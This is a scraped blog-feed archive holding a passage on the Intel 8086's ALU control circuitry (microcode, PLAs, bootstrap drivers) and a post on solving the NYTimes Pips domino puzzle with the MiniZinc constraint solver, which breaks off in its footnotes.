with a micro-instruction for each step of the machine instruction.\\n(I discuss the 8086\\'s microcode in detail here .)\\nThe 8086 uses an interesting architecture for microcode:\\neach micro-instruction performs two unrelated operations. The first operation moves data between a source and a destination.\\nThe second operation can range from a jump or subroutine call to a memory read/write or an ALU operation.\\nAn ALU operation has a five-bit field to specify a particular operation and a two-bit field to specify\\nwhich temporary register provides the input. As you\\'ll see below, these two fields play an important role in the ALU circuitry. \\n In many cases, the 8086\\'s micro-instruction doesn\\'t specify the ALU operation, leaving the details to be substituted from the machine instruction opcode.\\nFor instance, the ADD, SUB, ADC, SBB, AND, OR, XOR, and CMP\\nmachine instructions share the same microcode, while the hardware selects the ALU operation from the instruction opcode.\\nLikewise, the increment and decrement instructions use the same microcode, as do the decimal adjust instructions DAA and DAS, and the\\nASCII adjust instructions AAA and AAS.\\nInside the micro-instruction, all these operations are performed with a \"pseudo\" ALU operation called XI (for some reason).\\nIf the microcode specifies an XI ALU operation, the hardware replaces it with the ALU operation specified in the instruction.\\nAnother important feature of the microcode is \\nthat you need to perform one ALU micro-instruction to configure the ALU\\'s operation, but the result isn\\'t\\navailable until a later micro-instruction, which moves the result to a destination.\\nThis has the consequence that the hardware must remember the ALU operation. \\n To make this concrete, here is the microcode that implements a typical arithmetic instruction such as ADD AL, BL or XOR [BX+DI], CX .\\nThis microcode consists of three micro-instructions. \\nThe left half of each micro-instruction specifies a data movement, first moving the two arguments to ALU temporary registers\\nand then storing the ALU result (called \u03a3).\\nThe right half of each micro-instruction performs the second task.\\nFirst, the ALU is configured to perform an XI operation using temporary register A. Recall that XI indicates the ALU operation\\nis filled in from the machine instruction; this is how the same microcode handles eight different types of machine instructions.\\nIn the second micro-instruction, the next machine instruction is started unless a memory writeback is required ( WB ).\\nThe last micro-instruction is RNI (Run Next Instruction) to start a new machine instruction. It also indicates that the\\nprocessor status flags ( F ) should be updated to indicate if the ALU result is zero, positive, overflow, and so forth. 2 \\n\\n \\nM \u2192 tmpa   XI   tmpa Load first argument, configure ALU. \\nR \u2192 tmpb   WB,NXT Load second argument, start Next instruction if no memory writeback \\n\u03a3 \u2192 M      RNI  F Store ALU result, Run Next Instruction, update status Flags \\n \\n\\n The ALU circuit \\n The ALU is the heart of a processor, performing arithmetic and logic operations.\\nMicroprocessors of the 1970s typically supported addition and subtraction; logical AND, OR, and XOR; and various bit shift operations.\\n(Although the 8086 had multiply and divide instructions, these were implemented in microcode, not in the ALU.)\\nSince an ALU is both large and critical to performance, chip architects try to optimize its design.\\nAs a result, different microprocessors have widely different ALU designs.\\nFor instance, the 6502 microprocessor has separate circuits for addition and each logic operation; a multiplexer selects the appropriate\\noutput.\\nThe Intel 8085, on the other hand, uses an optimized clump of gates that performs the desired operation based on control signals ( details ), while the Z80\\'s 4-bit ALU uses a different clump of gates ( details ). \\n The 8086 takes a different approach, using two lookup tables (along with other gates) to generate the carry and output signals for each bit in the ALU.\\nBy setting the lookup tables appropriately, the ALU can be configured to perform the desired operation.\\n(This is similar to how an FPGA implements arbitrary functions through lookup tables.)\\nThe schematic below shows the circuit for one bit of the ALU.\\nI won\\'t explain this circuit in detail since I explained it in an earlier article . 3 \\nThe relevant part of this circuit is the six control signals at the left.\\nThe two multiplexers (trapezoidal symbols) implement the lookup tables by using the two input argument bits to select outputs from\\nthe control signals to control carry generation and carry propagation.\\nThus, by feeding appropriate control signals into the ALU, the 8086 can reconfigure the ALU to perform the desired operation.\\nFor instance, with one set of control signals, this circuit will add. Other sets of control signals will cause the circuit to subtract\\nor compute a logical operation, such as AND or XOR.\\nThe 8086 has 16 copies of this circuit, so it operates on 16-bit values. \\n The circuit that implements one bit in the 8086\\'s ALU. \\n The 8086 is a complicated processor, and its instructions have many special cases, so controlling the ALU is\\nmore complex than described above.\\nFor instance, the compare operation is the same as a subtraction, except the numerical result of a compare is discarded; just the\\nstatus flags are updated.\\nThe add versus add-with-carry instructions require different values for the carry into bit 0, while subtraction requires the\\ncarry flag to be inverted since it is treated as a borrow.\\nThe 8086\\'s ALU supports increment and decrement operations, but also increment and decrement by 2, which requires an increment signal into bit\\n1 instead of bit 0.\\nThe bit-shift operations all require special treatment. For instance, a rotate can use the carry bit or exclude the carry bit, while\\nand arithmetic shift right requires the top bit to be duplicated.\\nAs a result, along with the six lookup table (LUT) control signals, the ALU also requires numerous control signals to adjust its\\nbehavior for specific instructions.\\nIn the next section, I\\'ll explain how these control signals are generated. \\n ALU control circuitry on the die \\n The diagram below shows the components of the ALU control logic as they appear on the die.\\nThe information from the micro-instruction enters at the right and is stored in the latches.\\nThe PLAs (Programmable Logic Arrays) decode the instruction and generate the control signals.\\nThese signals flow to the left, where they control the ALU. \\n The ALU control logic as it appears on the die. I removed the metal layer to show the underlying polysilicon and silicon. The reddish lines are remnants of the metal. \\n As explained earlier, if the microcode specifies the XI operation, the operation field is replaced with a value based on the machine instruction opcode.\\nThis substitution is performed by the XI multiplexer before the value is stored in the operation latch.\\nBecause of the complexity of the 8086 instruction set, the XI operation is not as straightforward as you might expect.\\nThis multiplexer gets three instruction bits from a special register called the \"X\" register, another instruction bit from the instruction\\nregister, and the final bit from a decoding circuit called the Group Decode ROM. 4 \\n Recall that one micro-instruction specifies the ALU operation, and a later micro-instruction accesses the result. Thus, the\\nALU control circuitry must remember the specified operation so it can be used later. \\nIn particular, the control circuitry must keep track of the ALU operation to perform and the temporary register specified.\\nThe control circuitry uses three flip-flops to keep track of the specified temporary register, one flip-flop for each register.\\nThe micro-instruction contains a two-bit field that specifies the temporary register. The control circuitry decodes this field and\\nactivates the associated flip-flop.\\nThe outputs from these flip-flops go to the ALU and enable the associated temporary register.\\nAt the start of each machine instruction, 5 the flip-flops are reset, so temporary register A is selected by default. \\n The control circuitry uses five flip-flops to store the five-bit operation field from the micro-instruction.\\nAt the start of each machine instruction, the flip-flops are reset so operation 0 (ADD) is specified by default.\\nOne important consequence is that an add operation can potentially be performed without a micro-instruction to configure the ALU,\\nshortening the microcode by one micro-instruction and thus shortening the instruction time by one cycle. \\n The five-bit output from the operation flip-flops goes to the operation PLA (Programmable Logic Array) 7 , which decodes the operation\\ninto 27 control signals. 6 \\nMany of these signals go to the ALU, where they control the behavior of the ALU for special cases.\\nAbout 15 of these signals go to the Lookup Table (LUT) PLA, which generates the six lookup table signals for the ALU.\\nAt the left side of the LUT PLA, special high-current driver circuits amplify the control signals before they are sent to the ALU.\\nDetails on these drivers are in the footnotes. 8 \\n Conclusions \\n Whenever I look at the circuitry of the 8086 processor, I see the differences between a RISC chip and a CISC chip.\\nIn a RISC (Reduced Instruction Set Computer) processor such as ARM, instruction decoding is straightforward, as is the processor circuitry.\\nBut in the 8086, a CISC (Complex Instruction Set Computer) processor, there are corner cases and complications everywhere.\\nFor instance, an 8086 machine instruction sometimes specifies the ALU operation in the first byte and sometimes in the second byte,\\nand sometimes elsewhere, so the X register latch, the XI multiplexer, and the Group Decode ROM are needed.\\nThe 8086\\'s ALU includes obscure operations including four types of BCD adjustments and seven types of shifts, making the ALU more\\ncomplicated.\\nOf course, the continuing success of x86 shows that this complexity also has benefits. \\n This article has been a deep dive into the details of the 8086\\'s ALU, but I hope you have found it interesting.\\nIf it\\'s too much detail for you, you might prefer my overview of the 8086 ALU . \\n For updates, follow me on\\n Bluesky ( @righto.com ),\\nMastodon ( @kenshirriff@oldbytes.space ),\\nor RSS . \\n Credits:\\nThanks to Marcin Peczarski for discussion.\\nMy microcode analysis is based on Andrew Jenner\\'s 8086 microcode disassembly . \\n Notes and references \\n \\n \\n \\n \\n The operations implemented by the ALU are: \\n \\n 00 ADD Add \\n 01 OR Logical OR \\n 02 ADC Add with carry in \\n 03 SBB Subtract with borrow in \\n 04 AND Logical AND \\n 05 SUBT Subtract \\n 06 XOR Logical XOR \\n 07 CMP Comparison \\n 08 ROL Rotate left \\n 09 ROR Rotate right \\n 0a LRCY Left rotate through carry \\n 0b RRCY Right rotate through carry \\n 0c SHL Shift left \\n 0d SHR Shift right \\n 0e SETMO Set to minus one ( questionable ) \\n 0f SAR Arithmetic shift right \\n 10 PASS Pass argument unchanged \\n 11 XI Instruction specifies ALU op \\n 14 DAA Decimal adjust after addition \\n 15 DAS Decimal adjust after subtraction \\n 16 AAA ASCII adjust after addition \\n 17 AAS ASCII adjust after subtraction \\n 18 INC Increment \\n 19 DEC Decrement \\n 1a COM1 1\\'s complement \\n 1b NEG Negate \\n 1c INC2 Increment by 2 \\n 1d DEC2 Decrement by 2 \\n \\n Also see Andrew Jenner\\'s code . \u21a9 \\n \\n \\n You might wonder how this microcode handles the 8086\\'s complicated addressing modes such as [BX+DI] .\\nThe trick is that microcode subroutines implement the addressing modes.\\nFor details, see my article on 8086 addressing microcode . \u21a9 \\n \\n \\n The 8086\\'s ALU has a separate circuit to implement shift-right.\\nThe problem is that data in an ALU normally flows right-to-left as carries flow from lower bits to higher bits.\\nShifting data to the right goes against this direction, so it requires a special path.\\n(Shifting to the left is straightforward; you can add a number to itself.) \\n The adjust operations (DAA, DAS, AAA, AAS) also use completely separate circuitry.\\nThese operations generate correction factors for BCD (binary-coded decimal) arithmetic based on the value and flags.\\nThe circuitry for these operations is located with the flags circuitry, separate from the rest of the ALU circuitry. \u21a9 \\n \\n \\n In more detail, the 8086 stores bits 5-3 of the machine instruction in the \"X\" register.\\nFor an XI operation, the X register bits become bits 2-0 of the ALU operation specification, while bit 3 comes from bit 6 of the\\ninstruction, and bit 4 comes from the Group Decode ROM for\\ncertain instructions.\\nThe point of this is that the instruction set is designed so bits of the instruction correspond to bits of the ALU operation\\nspecifier, but the mapping is more complicated than you might expect.\\nThe eight basic arithmetic/logic operations (ADD, SUB, OR, etc) have a straightforward mapping that is visible from\\nthe 8086 opcode table , but the mapping for other instructions isn\\'t as obvious.\\nMoreover, sometimes the operation is specified in the first byte of the machine instruction, but sometimes it is specified\\nin the second byte, which is why the X register needs to store the relevant bits. \u21a9 \\n \\n \\n The flip-flops are reset by a signal in the 8086, called \"Second Clock\". When a new machine instruction is started, the \"First Clock\" signal\\nis generated on the instruction\\'s first byte and the \"Second Clock\" signal is generated on the instruction\\'s second byte.\\n(Note that these signals are not necessarily on consecutive clock cycles, because a memory fetch may be required if the\\ninstruction queue is empty.)\\nWhy are the flip-flops reset on Second Clock and not First Clock? The 8086 has a small degree of pipelining, so the previous\\nmicro-instruction may still be finishing up during First Clock of the next instruction. By Second Clock, it is safe to reset\\nthe ALU state. \u21a9 \\n \\n \\n For reference, the 27 outputs from the PLA are triggered by the following ALU micro-operations: \\n Output 0: RRCY (right rotate through carry) \\n Output 1: ROR (Rotate Right) \\n Output 2: BCD Adjustments: DAA (Decimal Adjust after Addition), DAS (Decimal Adjust after Subtraction), AAA (ASCII Adjust after Subtraction), or AAS (ASCII Adjust after Subtraction) \\n Output 3: SAR (Shift Arithmetic Right)\\n Output 4: Left shift: ROL (Rotate Left), RCL (Rotate through Carry Left), SHL (Shift Left), or SETMO (Set Minus One)\\n Output 5: Right shift: ROR (Rotate Right), RCR (Rotate through Carry Right), SHR (Shift Right), or SAR (Shift Arithmetic Right)\\n Output 6: INC2 (increment by 2) \\n Output 7: ROL (Rotate Left) \\n Output 8: RCL (Rotate through Carry Left)\\n Output 9: ADC (add with carry) \\n Output 10: DEC2 (decrement by 2) \\n Output 11: INC (increment) \\n Output 12: NEG (negate) \\n Output 13: ALU operation 12 (unused?)\\n Output 14: SUB (Subtract), CMP (Compare), DAS (Decimal Adjust after Subtraction), AAS (ASCII Adjust after Subtraction)\\n Output 15: SBB (Subtract with Borrow) \\n Output 16: ROL (Rotate Left) or RCL (Rotate through Carry Left)\\n Output 17: ADD or ADC (Add with Carry)\\n Output 18: DEC or DEC2 (Decrement by 1 or 2)\\n Output 19: PASS (pass-through) or INC (Increment)\\n Output 20: COM1 (1\\'s Complement) or NEG (Negate) \\n Output 21: XOR \\n Output 22: OR \\n Output 23: AND \\n Output 24: SHL (Shift Left)\\n Output 25: DAA or AAA (Decimal/ASCII Adjust after Addition)\\n Output 26: CMP (Compare) \u21a9 \\n \\n \\n A Programmable Logic Array is a way of implementing logic gates in a structured grid. PLAs are often used in microprocessors because\\nthey provide a dense way of implementing logic.\\nA PLA normally consists of two layers: an \"OR\" layer and an \"AND\" layer. Together, the layers produce \"sum-of-products\" outputs,\\nconsisting of multiple terms OR\\'d together.\\nThe ALU\\'s PLA is a bit unusual because many outputs are taken directly from the OR layer, while only about 15 outputs from the\\nfirst layer are fed into the second layer. \u21a9 \\n \\n \\n The control signals pass through the driver circuit below.\\nThe operation of this circuit puzzled me for years, since the transistor with its gate at +5V seems to be stuck on.\\nBut I was looking at the book DRAM Circuit Design and spotted the same circuit, called \\nthe \"Bootstrap Wordline Driver\".\\nThe purpose of this circuit is to boost the output to a higher voltage than a regular NMOS circuit, providing better performance.\\nThe problem with NMOS circuitry is that NMOS transistors aren\\'t very good at pulling a signal high: due to the properties of the\\ntransistor, the output voltage is less than the gate voltage, lower by the threshold voltage V TH , half a volt or more. \\n The drive signals to the ALU gates are generated with this dynamic circuit. \\n The bootstrap circuit takes advantage of capacitance to get more voltage out of the circuit.\\nSpecifically, suppose the input is +5V, while the clock is high. Point A will be about 4.5V, losing half a volt due to the threshold.\\nNow, suppose the clock goes low, so the inverted clock driving the upper transistor goes high.\\nDue to capacitance in the second transistor, as the source and drain go high, the gate will\\nbe pulled above its previous voltage, maybe gaining a couple of volts.\\nThe high voltage on the gate produces a full-voltage output, avoiding\\nthe drop due to V TH .\\nBut why the transistor with its gate at +5V? This transistor acts somewhat like a diode, preventing the boosted voltage from flowing\\nbackward through the input and dissipating. \\n The bootstrap circuit is used on the ALU\\'s lookup table control signals for two reasons.\\nFirst, these control signals drive pass transistors. A pass transistor suffers from a voltage drop due to the threshold voltage,\\nso you want to start with a control signal with as high a voltage as possible.\\nSecond, each control signal is connected to 16 transistors (one for each bit).\\nThis is a large number of transistors to drive from one signal, since each transistor has gate capacitance.\\nIncreasing the voltage helps overcome the R-C (resistor-capacitor) delay, improving performance. \\n A close-up of the bootstrap drive circuits, in the left half of the LUT PLA. \\n The diagram above shows six bootstrap drivers on the die. At the left are the transistors that ground the signals when clock is\\nhigh. The +5V transistors are scattered around the image; two of them are labeled.\\nThe six large transistors provide the output signal, controlled by clock\\'.\\nNote that these transistors are much larger than the other transistors because they must produce the high-current output,\\nwhile the other transistors have more of a supporting role. \\n (Bootstrap circuits go way back; Federico Faggin designed a bootstrap circuit for the Intel 8008 that he claimed \"proved essential to the microprocessor realization.\") \u21a9 \\n \\n \\n '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:51:49</p>"},{"location":"righto.com/Solving%20the%20NYTimes%20Pips%20puzzle%20with%20a%20constraint%20solver_20251018/","title":"Solving the NYTimes Pips puzzle with a constraint solver","text":"<p>\u6765\u6e90: righto.com \u53d1\u5e03\u65f6\u95f4: 2025-10-18T08:41:00.000-07:00 \u94fe\u63a5: http://www.righto.com/2025/10/solve-nyt-pips-with-constraints.html</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://www.righto.com/feeds/posts/default', 'value': ' The New York Times recently introduced a new daily puzzle called Pips .\\nYou place a set of dominoes on a grid, satisfying various conditions.\\nFor instance, in the puzzle below,\\nthe pips (dots) in the purple squares must sum to 8,\\nthere must be fewer than 5 pips in the red square, and the pips in the three green squares must be equal.\\n(It doesn\\'t take much thought to solve this \"easy\" puzzle, but the \"medium\" and \"hard\" puzzles\\nare more challenging.) \\n The New York Times Pips puzzle from Oct 5, 2025 (easy). Hint: What value must go in the three green squares? \\n I was wondering about how to solve these puzzles with a computer.\\nRecently, I saw an article on Hacker News \u2014\" Many hard LeetCode problems are easy constraint problems \"\u2014that described the benefits and flexibility of a system called\\na constraint solver.\\nA constraint solver takes a set of constraints and finds solutions that satisfy the constraints: exactly\\nwhat Pips requires. \\n I figured that solving Pips with a constraint solver would be a good way to learn more about these\\nsolvers, but I had several questions.\\nDid constraint solvers require incomprehensible mathematics?\\nHow hard was it to express a problem? Would the solver quickly solve the problem, or\\nwould it get caught in an exponential search? \\n It turns out that using a constraint solver was straightforward; it took me under two hours from\\nknowing nothing about constraint solvers to solving the problem.\\nThe solver found solutions in milliseconds (for the most part).\\nHowever, there were a few bumps along the way.\\nIn this blog post, I\\'ll discuss my experience with the MiniZinc 1 constraint\\nmodeling system and show how it can solve Pips. \\n Approaching the problem \\n Writing a program for a constraint solver is very different from writing a regular program.\\nInstead of telling the computer how to solve the problem, you tell it what you want:\\nthe conditions that must be satisfied.\\nThe solver then \"magically\" finds solutions that satisfy the problem. \\n To solve the problem, I created an array called pips that holds the number of domino pips at each position\\nin the grid.\\nThen, the three constraints for the above problem can be expressed as follows.\\nYou can see how the constraints directly express the conditions in the puzzle. \\n \\nconstraint pips[1,1] + pips[2,1] == 8;\\nconstraint pips[2,3] &lt; 5;\\nconstraint all_equal([pips[3,1], pips[3,2], pips[3,3]]);\\n \\n\\n Next, I needed to specify where dominoes could be placed for the puzzle.\\nTo do this, I defined an array called grid that indicated the allowable positions: 1 indicates a valid\\nposition and 0 indicates an invalid position. (If you compare with the puzzle at the top of the article,\\nyou can see that the grid below matches its shape.) \\n \\ngrid = [|\\n1,1,0|\\n1,1,1|\\n1,1,1|];\\n \\n\\n I also defined the set of dominoes for the problem above, specifying the number of spots in each half: \\n \\nspots = [|5,1| 1,4| 4,2| 1,3|];\\n \\n\\n So far, the constraints directly match the problem.\\nHowever, I needed to write some more code to specify how these pieces interact.\\nBut\\nbefore I describe that code, I\\'ll show a solution.\\nI wasn\\'t sure what to expect: would the constraint solver give me a solution or would it spin\\nforever?\\nIt turned out to find the unique solution in 109 milliseconds, printing out the\\nsolution arrays.\\nThe pips array shows the number of pips in each position, while the dominogrid array shows which\\ndomino (1 through 4) is in each position. \\n \\npips = \\n[| 4, 2, 0\\n | 4, 5, 3\\n | 1, 1, 1\\n |];\\ndominogrid = \\n[| 3, 3, 0\\n | 2, 1, 4\\n | 2, 1, 4\\n |];\\n \\n\\n The text-based solution above is a bit ugly.\\nBut it is easy to create graphical output.\\nMiniZinc provides a JavaScript API, so you can easily display\\nsolutions on a web page.\\nI wrote a few lines of JavaScript to draw the solution, as shown below.\\n(I just display the numbers since I was too lazy to draw the dots.)\\nSolving this puzzle is not too impressive\u2014it\\'s an \"easy\" puzzle after all\u2014but I\\'ll show below that\\nthe solver can also handle considerably more difficult puzzles. \\n Graphical display of the solution. \\n Details of the code \\n While the above code specifies a particular puzzle, a bit more code is required to define\\nhow dominoes and the grid interact.\\nThis code may appear strange because it is implemented as constraints, rather than the\\nprocedural operations in a normal program. \\n My main design decision was how to specify the locations of dominoes.\\nI considered assigning a grid position and orientation\\nto each domino, but it seemed inconvenient to deal with multiple orientations.\\nInstead, I decided to position each half of the domino independently, with an x and y coordinate in\\nthe grid. 2 I added a constraint that the two halves of each domino had to be in neighboring cells,\\nthat is, either the X or Y coordinates had to differ by 1. \\n \\nconstraint forall(i in DOMINO) (abs(x[i, 1] - x[i, 2]) + abs(y[i, 1] - y[i, 2]) == 1);\\n \\n\\n It took a bit of thought to fill in the pips array with the number of spots on each domino.\\nIn a normal programming language, one would loop over the dominoes and store the values into pips .\\nHowever, here it is done with a constraint so the solver makes sure the values are assigned.\\nSpecifically, for each half-domino, the pips array entry at\\nthe domino\\'s x/y coordinate must equal the corresponding spots on the domino: \\n \\nconstraint forall(i in DOMINO, j in HALF) (pips[y[i,j], x[i, j]] == spots[i, j]);\\n \\n\\n I decided to add another array to keep track of which domino is in which position.\\nThis array is useful to see the domino locations in the output, but it also\\nkeeps dominoes from overlapping.\\nI used a constraint to put each domino\\'s number (1, 2, 3, etc.) into the occupied position of dominogrid : \\n \\nconstraint forall(i in DOMINO, j in HALF) (dominogrid[y[i,j], x[i, j]] == i);\\n \\n\\n Next, how do we make sure that dominoes only go into positions allowed by grid ?\\nI used a constraint that a square in dominogrid must be empty or the corresponding grid must allow a domino. 3 \\nThis uses the \"or\" condition, which is expressed as \\/ , an unusual stylistic\\nchoice. (Likewise, \"and\" is expressed as /\\ . These correspond to the logical symbols\\n\u2228 and \u2227.) \\n \\nconstraint forall(i in 1..H, j in 1..W) (dominogrid[i, j] == 0 \\/ grid[i, j] != 0);\\n \\n\\n Honestly, I was worried that I had too many arrays and the solver would end up in a rathole ensuring that the arrays were consistent.\\nBut I figured I\\'d try this brute-force approach and see if it worked.\\nIt turns out that it worked for the most part, so I didn\\'t need to do anything more clever. \\n Finally, the program requires a few lines to define some constants and variables.\\nThe constants below define the number of dominoes and the size of the grid for a particular problem: \\n \\nint: NDOMINO = 4; % Number of dominoes in the puzzle\\nint: W = 3; % Width of the grid in this puzzle\\nint: H = 3; % Height of the grid in this puzzle\\n \\n\\n Next, datatypes are defined to specify the allowable values.\\nThis is very important for the solver; it is a \"finite domain\" solver, so limiting the size of\\nthe domains reduces the size of the problem.\\nFor this problem, the values are integers in a particular range, called a set : \\n \\nset of int: DOMINO = 1..NDOMINO; % Dominoes are numbered 1 to NDOMINO\\nset of int: HALF = 1..2; % The domino half is 1 or 2\\nset of int: xcoord = 1..W; % Coordinate into the grid\\nset of int: ycoord = 1..H;\\n \\n\\n At last, I define the sizes and types of the various arrays that I use.\\nOne very important syntax is var , which indicates variables that the solver must determine.\\nNote that the first two arrays, grid and spots do not have var since they are constant,\\ninitialized to specify the problem. \\n \\narray[1..H,1..W] of 0..1: grid; % The grid defining where dominoes can go\\narray[DOMINO, HALF] of int: spots; % The number of spots on each half of each domino\\narray[DOMINO, HALF] of var xcoord: x; % X coordinate of each domino half\\narray[DOMINO, HALF] of var ycoord: y; % Y coordinate of each domino half\\narray[1..H,1..W] of var 0..6: pips; % The number of pips (0 to 6) at each location.\\narray[1..H,1..W] of var 0..NDOMINO: dominogrid; % The domino sequence number at each location\\n \\n\\n You can find all the code on GitHub .\\nOne weird thing is that because the code is not procedural, the lines can be in any order.\\nYou can use arrays or constants before you use them.\\nYou can even move include statements to the end of the file if you want! \\n Complications \\n Overall, the solver was much easier to use than I expected. However, there were a few complications. \\n By changing a setting, the solver can find multiple solutions instead of stopping after the first.\\nHowever, when I tried this, the solver generated thousands of meaningless solutions.\\nA closer look showed that the problem was that the solver was putting arbitrary numbers into the \"empty\"\\ncells, creating valid but pointlessly different solutions.\\nIt turns out that I didn\\'t explicitly forbid this, so the sneaky constraint solver went ahead and\\ngenerated tons of solutions that I didn\\'t want.\\nAdding another constraint fixed the problem.\\nThe moral is that even if you think your constraints are clear, solvers are very good at finding unwanted\\nsolutions that technically satisfy the constraints.\\n 4 \\n A second problem is that if you do something wrong, the solver simply says that the problem is\\nunsatisfiable. Maybe there\\'s a clever way of debugging, but I ended up removing constraints until\\nthe problem can be satisfied, and then see what I did wrong with that constraint.\\n(For instance, I got the array indices backward at one point, making the problem insoluble.) \\n The most concerning issue is the unpredictability of the solver:\\nmaybe it will take milliseconds or maybe it will take hours.\\nFor instance, the Oct 5 hard Pips puzzle (below) caused the solver to take minutes for no apparent reason.\\nHowever, the MiniZinc IDE supports different solver backends. I switched from the default Gecode solver to\\n Chuffed , and it immediately found numerous solutions, 384 to\\nbe precise.\\n(Sometimes the Pips puzzles sometimes have multiple solutions, which players find controversial .)\\nI suspect that the multiple solutions messed up the Gecode solver somehow, perhaps because\\nit couldn\\'t narrow down a \"good\" branch in the search tree.\\nFor a benchmark of the different solvers, see the footnote. 5 \\n Two of the 384 solutions to the NYT Pips puzzle from Oct 5, 2025 (hard difficulty). \\n How does a constraint solver work? \\n If you were writing a program to solve Pips from scratch, you\\'d probably have a loop to try\\nassigning dominoes to positions.\\nThe problem is that the problem grows exponentially. If you have 16 dominoes, there are 16 choices\\nfor the first domino, 15 choices for the second, and so forth, so about 16! combinations in total,\\nand that\\'s ignoring orientations.\\nYou can think of this as a search tree: at the first step, you have 16 branches. For the next step,\\neach branch has 15 sub-branches. Each sub-branch has 14 sub-sub-branches, and so forth. \\n An easy optimization is to check the constraints after each domino is added. For instance, as soon\\nas the \\n\"less than 5\" constraint is violated, you can backtrack and skip that entire\\nsection of the tree.\\nIn this way, only a subset of the tree needs to be searched; the number of branches will be large, but\\nhopefully manageable. \\n A constraint solver works similarly, but in a more abstract way.\\nThe constraint solver assigns values to the variables, backtracking when a conflict is detected.\\nSince the underlying problem is typically NP-complete, the solver uses heuristics to attempt to\\nimprove performance.\\nFor instance, variables can be assigned in different orders. The solver attempts to generate\\nconflicts as soon as possible so large pieces of the search tree can be pruned sooner rather than later.\\n(In the domino case, this corresponds to placing dominoes in places with the tightest constraints, rather\\nthan scattering them around the puzzle in \"easy\" spots.) \\n Another technique is constraint propagation. The idea is that you can derive new constraints and\\ncatch conflicts earlier. For instance, suppose you have a problem with the constraints \"a equals c\" and \"b equals c\".\\nIf you assign \"a=1\" and \"b=2\", you won\\'t find a conflict until later, when you try to find a value for \"c\".\\nBut with constraint propagation, you can derive a new constraint \"a equals b\", and the problem will\\nturn up immediately.\\n(Solvers handle more complicated constraint propagation, such as inequalities.)\\nThe tradeoff is that generating new constraints takes time and makes the problem larger, so constraint\\npropagation can make the solver slower. Thus, heuristics are used to decide when to apply constraint propagation. \\n Researchers are actively developing new\\nalgorithms, heuristics, and optimizations 6 such as backtracking more aggressively\\n(called \"backjumping\"),\\nkeeping track of failing variable assignments (called \"nogoods\"), and\\nleveraging Boolean SAT (satisfiability) solvers.\\nSolvers compete in annual challenges to test\\nthese techniques against each other.\\nThe nice thing about a constraint solver is that you don\\'t need to know anything about these techniques;\\nthey are applied automatically. \\n Conclusions \\n I hope this has convinced you that constraint solvers are interesting, not too scary, and can solve\\nreal problems with little effort.\\nEven as a beginner, I was able to get started with MiniZinc quickly.\\n(I read half the tutorial and then jumped into programming.) \\n One reason to look at constraint solvers is that they are a completely different programming paradigm.\\nUsing a constraint solver is like programming on a higher level, not worrying about how the problem\\ngets solved or what algorithm gets used.\\nMoreover, analyzing a problem in terms of constraints is a different way of thinking about algorithms.\\nSome of the time it\\'s frustrating when you can\\'t use familiar constructs such as loops and assignments,\\nbut it expands your horizons. \\n Finally,\\nwriting code to solve Pips is more fun than solving the problems by hand, at least in my opinion,\\nso give it a try! \\n For more, follow me on\\n Bluesky ( @righto.com ),\\nMastodon ( @kenshirriff@oldbytes.space ),\\n RSS , or subscribe here . \\n Solution to the Pips puzzle, September 21, 2005 (hard). This puzzle has regions that must all be equal (=) and regions that must all be different (\u2260). Conveniently, MiniZinc has all_equal and alldifferent constraint functions. \\n Notes and references \\n \\n \\n \\n \\nI started by downloading the MiniZinc IDE and reading the\\n MiniZinc tutorial . The MiniZinc IDE is straightforward, with an editor window at the top and an output window at\\nthe bottom. Clicking the \"Run\" button causes it to generate a solution. \\n Screenshot of the MiniZinc IDE. Click for a larger view. \\n \u21a9 \\n \\n \\n It might be cleaner to combine the X and Y coordinates into a single Point type, using a MiniZinc record type . \u21a9 \\n \\n \\n I later decided that it made more sense to enforce that dominogrid is empty if and only if\\n grid is 0 at that point, although it doesn\\'t affect the solution.\\nThis constraint uses the \"if and only if\" operator &lt;-&gt; . \\n \\nconstraint forall(i in 1..H, j in 1..W) (dominogrid[i, j] == 0 &lt;-&gt; grid[i, j] == 0);\\n \u21a9 \\n \\n \\n To prevent the solver from putting arbitrary numbers in the unused positions of pips , I added a\\nconstraint to force these values to be zero: \\n \\nconstraint forall(i in 1..H, j in 1..W) (grid[i, j] == 0 -&gt; pips[i, j] == 0);\\n \\n Generating multiple solutions had a second issue, which I expected: A symmetric domino can be\\nplaced in two redundant ways.\\nFor instance, a double-six domino can be flipped to produce a solution that is technically\\ndifferent but looks the same. I fixed this by adding constraints for each symmetric domino\\nto allow only one of the two redundant positions. The constraint below forces a preferred\\norientation for symmetric dominoes. \\n \\nconstraint forall(i in DOMINO) (spots[i,1] != spots[i,2] \\/ x[i,1] &gt; x[i,2] \\/ (x[i,1] == x[i,2] /\\ y[i,1] &gt; y[i,2]));\\n \\n To enable multiple solutions in MiniZinc, the setting is under Show Configuration Editor &gt; User Defined Behavior &gt;\\nSatisfaction Problems or the --all flag from the command line. \u21a9 \\n \\n \\n MiniZinc has five solvers that can solve this sort of integer problem: Chuffed ,\\n OR Tools CP-SAT ,\\n Gecode ,\\n HiGHS ,\\nand Coin-OR BC .\\nI measured the performance of the five solvers against 20 different Pips puzzles.\\nMost of the solvers found solutions in under a second, most of the time, but there is a lot\\nof variation. \\n Timings for different solvers on 20 Pip puzzles. \\n Overall, Chuffed had the best performance on the puzzles that I tested, taking well under a second.\\nGoogle\\'s OR-Tools won all\\nthe categories in the 2025 MiniZinc challenge ,\\nbut it was considerably slower than Chuffed for my Pips programs.\\nThe default Gecode solver performed very well most of the time, but it did terribly on a few\\nproblems, taking over 15 minutes.\\nHiGHs was slower in general, taking a few minutes on the hardest problems, but it didn\\'t fail\\nas badly as Gecode.\\n(Curiously, Gecode and HiGHS sometimes found different problems to be difficult.)\\nFinally, Coin-OR BC was uniformly bad; at best it took a few seconds, but one puzzle took almost two\\nhours and others weren\\'t solved before I gave up after two hours.\\n(I left Coin-OR BC off the graph because it messed up the scale.) \\n Don\\'t treat these results too seriously because different solvers are optimized for\\ndifferent purposes. (In particular, Coin-OR BC is designed for linear problems.)\\nBut the results demonstrate the unpredictability of solvers: maybe you get a solution in a second\\nand maybe you get a solution in hours. \u21a9 \\n \\n \\n If you want to read more about solvers, Constraint Satisfaction Problems is an overview presentation.\\nThe Gecode algorithms are described in a nice technical report: Constraint Programming Algorithms used in Gecode .\\nChuffed is more complicated: \"Chuffed is a state of the art lazy clause solver designed from the ground up with lazy clause generation in mind. Lazy clause generation is a hybrid approach to constraint solving that combines features of finite domain propagation and Boolean satisfiability.\"\\nThe Chuffed paper Lazy clause generation reengineered \\nand slides are more of a 